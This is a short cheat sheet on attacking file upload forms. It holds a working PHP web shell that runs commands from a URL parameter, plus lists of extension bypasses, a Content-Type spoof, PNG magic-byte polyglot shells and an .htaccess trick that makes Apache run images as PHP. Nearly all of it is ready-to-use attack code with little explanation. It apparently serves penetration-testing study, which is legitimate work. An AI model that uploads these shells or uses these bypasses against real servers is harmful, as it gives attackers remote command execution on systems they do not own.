# File Upload Attacks

## Basic PHP Web Shell Upload

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload through the form
# Access: http://TARGET/uploads/shell.php?cmd=whoami
```

## Extension Bypass

```
shell.php3    shell.php5    shell.phtml    shell.phar
shell.php.jpg              # double extension
shell.jpg.php              # double extension (reverse)
shell.php%00.jpg           # null byte (PHP < 5.3.4)
shell.pHp                  # case manipulation
```

## Content-Type Bypass (in Burp)

```
Change: Content-Type: application/x-php
To:     Content-Type: image/jpeg
```

## Magic Bytes

```bash
# PNG header + PHP code
echo -e '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
```

## .htaccess Upload (Apache)

```
# Upload .htaccess with: AddType application/x-httpd-php .jpg
# Then upload shell.jpg — Apache executes it as PHP
```
